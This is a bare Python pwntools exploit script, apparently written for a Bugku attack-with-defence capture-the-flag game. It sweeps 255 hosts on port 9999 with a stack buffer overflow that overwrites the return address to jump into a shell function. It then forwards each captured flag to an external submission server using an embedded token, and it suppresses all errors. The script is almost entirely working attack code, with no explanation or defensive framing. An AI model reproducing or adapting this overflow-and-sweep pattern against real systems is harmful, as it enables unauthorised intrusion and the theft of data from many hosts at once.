from pwn import *

import requests

context.update( os = 'linux', arch = "amd64",timeout = 1)
#p = process("./helloworld")

def pwn(id):
    aim_ip = "192-168-1-%d.awd.bugku.cn" % id
    p = remote(aim_ip,"9999")

    getshell = 0x000000000400751

    payload = "a"*0x38 + p64(getshell)
    p.sendlineafter("something?",payload)

    sleep(1)
    flag = p.recv().decode()
    print("\n\n==================")
    print(flag)
    print("==================\n\n")

    requests.get("https://ctf.bugku.com/awd/submit.html?token=0f3b4beea161bfc206337878d18308dd&flag=" + flag)

for i in range(1,256):
    try:
        pwn(i)
    except:
        pass